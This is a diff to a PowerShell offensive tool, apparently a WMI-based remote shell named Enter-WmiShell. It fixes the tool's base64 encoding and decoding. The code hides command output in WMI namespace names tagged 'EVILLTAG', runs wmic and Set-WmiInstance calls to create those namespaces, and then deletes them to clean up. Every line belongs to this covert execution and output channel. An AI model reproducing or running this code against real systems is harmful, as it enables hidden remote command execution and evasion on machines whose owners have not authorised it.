@@ -51,21 +51,25 @@ Author : Jesse "RBOT" Davis
 			foreach ($line in $sortStrings) {
 	
 				#Replace non-base64 characters
-				$cleanString = $line.Remove(0, 14) -replace 'Ã', '\+' -replace '_', '/'
+				$cleanString = $line.Remove(0, 14) -replace [char]0x00F3,'\+' -replace '_','/'
 				
 				# Decode base64 padded string and remove front side spaces
-				$decodeString = ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($cleanString + '=')).Remove(0, 8))
-				
-				# Remove back side spaces and append output
-				$decodedOutput += $decodeString.Remove(($decodeString.Length - 8), 8)
-			}
-            Write-Host $decodedOutput
-	}	
+				Try { $decodeString = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($cleanString)) }
+		        Catch [System.Management.Automation.MethodInvocationException] {
+			        Try { $decodeString = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($cleanString + "=")) }
+			        Catch [System.Management.Automation.MethodInvocationException] {
+			               $decodeString = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($cleanString + "==")) }
+			        Finally {}
+		        }
+		        Finally { $decodedOutput += $decodeString.Remove(($decodeString.Length - 8), 8)}
+                Write-Host $decodedOutput
+	        }
+        }	
 
 	else {
         #Decode single line Base64
 		$getStrings = $getOutput.Name
-		$cleanString = $getStrings.Remove(0, 14) -replace "`"", "+" -replace "Ãƒ", "" -replace "_", "/"
+		$cleanString = $getStrings.Remove(0, 14) -replace [char]0x00F3,'\+' -replace '_','/'
 		Try { $decodedOutput = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($cleanString)) }
 		Catch [System.Management.Automation.MethodInvocationException] {
 			Try { $decodedOutput = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($cleanString + "=")) }
@@ -291,11 +295,12 @@ function Enter-WmiShell{
                     `$wshell = New-Object -c WScript.Shell
                     function Insert-Piece(`$i, `$piece) {
                             `$count = `$i.ToString()
-	                        `$zeros = "0" * (6 - `$count.Length)
+	                    `$zeros = "0" * (6 - `$count.Length)
 	                        `$tag = "EVILLTAG" + `$zeros + `$count
 	                        `$piece = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(`$piece))
-	                        `$piece = `$tag + `$piece -replace '\+','Ã' -replace '/','_' -replace '=',''
-	                        `$null = `$wshell.Exec("wmic.exe /NAMESPACE:\\root\default PATH __Namespace CREATE Name='" + `$piece + "'")
+                            `$piece = `$piece -replace '\+',[char]0x00F3 -replace '/','_' -replace '=',''
+	                        `$piece = `$tag + `$piece 
+	                        `$null = Set-WmiInstance -EnableAll -Namespace root\default -Path __Namespace -PutType CreateOnly -Arguments @{Name=`$piece}
                             Start-Sleep -m 50
                         }
                         `$null = `$wshell.Exec("wmic.exe /NAMESPACE:\\root\default PATH __Namespace where ""Name LIKE 'OUTPUT_READY' OR Name like '%EVILLTAG%'"" delete")
